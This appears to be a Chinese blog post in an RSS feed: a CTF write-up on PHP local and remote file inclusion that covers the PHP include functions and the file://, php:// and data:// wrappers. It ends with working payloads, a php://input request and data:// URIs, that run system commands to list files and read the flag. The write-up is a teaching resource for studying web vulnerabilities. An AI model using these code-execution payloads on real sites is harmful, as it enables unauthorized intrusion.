&lt;p&gt;由于这段代码对用户输入的  &lt;code&gt;$page&lt;/code&gt;  参数直接进行了  &lt;code&gt;include&lt;/code&gt; ，存在安全风险。未经验证的用户输入可能导致远程文件包含（RFI）攻击或代码注入漏洞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;一、文件包含漏洞分类&lt;/p&gt;
&lt;p&gt;LFI(Local File Inclusion)&lt;br&gt;
 本地文件包含漏洞，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是 LFI。&lt;br&gt;
为了方便本文把 LFI 直接称为文件包含漏洞。&lt;/p&gt;
&lt;p&gt;RFI(Remote File Inclusion)&lt;br&gt;
 远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。但 RFI 的利用条件较为苛刻，需要 php.ini 中进行配置&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;allow_url_fopen = On
allow_url_include = On
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;两个配置选项均需要为 On，才能远程包含文件成功。&lt;br&gt;
在 php.ini 中，allow_url_fopen 默认一直是 On，而 allow_url_include 从 php5.2 之后就默认为 Off。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;二、文件包含漏洞原理&lt;/p&gt;
&lt;p&gt;本地文件包含（Local File Inclusion）漏洞，是程序员在网站设计中，为方便自己在设计构架时，使用了一些包含的函数，在文件中包含一个文件。&lt;/p&gt;
&lt;p&gt;服务器执行 PHP 文件时，可以通过文件包含函数加载另一个文件中的 PHP 代码，并且当 PHP 来执行，这会为开发者节省大量的时间。&lt;/p&gt;
&lt;p&gt;这意味着可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，只更新一个包含文件就可以了，或者当向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。&lt;/p&gt;
&lt;p&gt;LFI 产生的原因是由于程序员未对用户可控变量进行输入检查，此漏洞的影响可能导致泄露服务器上的敏感文件等。&lt;br&gt;
如若攻击者能够通过其他方式在 Web 服务器上放置代码，那么他们便可以执行任意命令&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;三、文件包含函数&lt;/p&gt;
&lt;p&gt;PHP 中文件包含函数有以下四种：&lt;/p&gt;
&lt;p&gt;require () // 只在执行到此函数时才去包含文件，若包含的文件不存在产生警告，程序继续运行&lt;/p&gt;
&lt;p&gt;require_once () // 如果一个文件已经被包含过，则不会在包含它&lt;/p&gt;
&lt;p&gt;include () // 程序一运行文件便会包含进来，若包含文件不存在产生致命错误，程序终止运行&lt;/p&gt;
&lt;p&gt;include_once () // 如果一个文件已经被包含过，则不会在包含它&lt;/p&gt;
&lt;p&gt;include 和 require 区别主要是，include 在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；&lt;br&gt;
而 require 函数出现错误的时候，会直接报错并退出程序的执行。&lt;/p&gt;
&lt;p&gt;而 include_once ()，require_once () 这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。&lt;/p&gt;
&lt;p&gt;这四个函数可以将任意类型的文件当做 PHP 文件进行解析。&lt;br&gt;
示例代码：&lt;/p&gt;
   &lt;?php
       $filename  = $_GET[&#39;filename&#39;]; // 存在可控变量
       include($filename); // 存在动态变量
   ?&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;G&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;mtext&gt;‘&lt;/mtext&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mtext&gt;’&lt;/mtext&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mtext&gt;参数开发者没有经过严格的过滤，直接带入了&lt;/mtext&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mtext&gt;的函数，攻击者可以修改&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_GET[‘filename’]参数开发者没有经过严格的过滤，直接带入了include的函数，
攻击者可以修改
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;G&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;‘&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;’&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;参&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;开&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;发&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;者&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;没&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;有&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;经&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;过&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;严&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;格&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;过&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;滤&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;直&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;接&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;带&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;入&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;了&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;函&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;攻&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;击&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;者&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;可&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;以&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;修&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;改&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_GET [‘filename’] 的值，执行非预期的操作。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;【file:// 协议】&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;file:// 协议在双 off 的情况下也可以正常使用；&lt;/p&gt;
&lt;p&gt;allow_url_fopen ：off/on&lt;/p&gt;
&lt;p&gt;allow_url_include：off/on&lt;/p&gt;
&lt;p&gt;file:// 用于访问本地文件系统，在 CTF 中通常用来读取本地文件的且不受 allow_url_fopen 与 allow_url_include 的影响。&lt;/p&gt;
&lt;p&gt;使用方法：&lt;/p&gt;
&lt;p&gt;file:// [文件的绝对路径和文件名]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;【php:// 协议】&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;条件：&lt;/p&gt;
&lt;p&gt;不需要开启 allow_url_fopen，仅 php://input、 php://stdin、 php://memory 和 php://temp 需要开启 allow_url_include。&lt;/p&gt;
&lt;p&gt;php://filter 读取源代码并进行 base64 编码输出，不然会直接当做 php 代码执行就看不到源代码内容了。&lt;/p&gt;
&lt;p&gt;php://input 可以访问请求的原始数据的只读流，将 post 请求中的数据作为 PHP 代码执行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;【data:// 协议】&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;经过测试官方文档上存在一处问题，经过测试 PHP 版本 5.2，5.3，5.5，7.0；data:// 协议是是受限于 allow_url_fopen 的，官方文档上给出的是 NO，所以要使用 data:// 协议需要满足双 on 条件&lt;/p&gt;
&lt;p&gt;例子：&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9ZGF0YTovL3RleHQvcGxhaW4=&#34;&gt;http://127.0.0.1/cmd.php?file=data://text/plain&lt;/span&gt;,&lt;?php phpinfo()?&gt;&lt;/p&gt;
&lt;p&gt;or&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9ZGF0YTovL3RleHQvcGxhaW47YmFzZTY0LFBEOXdhSEFnY0dod2FXNW1ieWdwUHo0PQ==&#34;&gt;http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/713e77b23fb645afa92fb923eda7ac77.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;方法一：&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;php 协议：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824233946558.png&#34; alt=&#34;image-20230824233946558&#34;&gt;&lt;/p&gt;
&lt;p&gt;只能用 burp 不能用 harkbar 有点奇怪&lt;/p&gt;
&lt;p&gt;请求包：&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token request-line&#34;&gt;&lt;span class=&#34;token method property&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;token request-target url&#34;&gt;/?page=PhP://input&lt;/span&gt; &lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;61.147.171.105:64567&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Cache-Control&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;max-age=0&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;gzip, deflate&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept-Language&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;zh-CN,zh;q=0.9&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;close&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;21&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;?php system(&#34;ls&#34;);?&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;有 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824234142386.png&#34; alt=&#34;image-20230824234142386&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到 flag&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;方法二：&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824235157008.png&#34; alt=&#34;image-20230824235157008&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token header-value&#34;&gt;//text/plain,&amp;lt;?php system(&#34;ls&#34;)?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token header-value&#34;&gt;//text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=   //推荐&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;都可以&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824235301184.png&#34; alt=&#34;image-20230824235301184&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token header-value&#34;&gt;//text/plain,&amp;lt;?php system(&#34;cat fl4gisisish3r3.php&#34;)?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token header-value&#34;&gt;//text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==   //推荐&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
    </channel>
</rss>
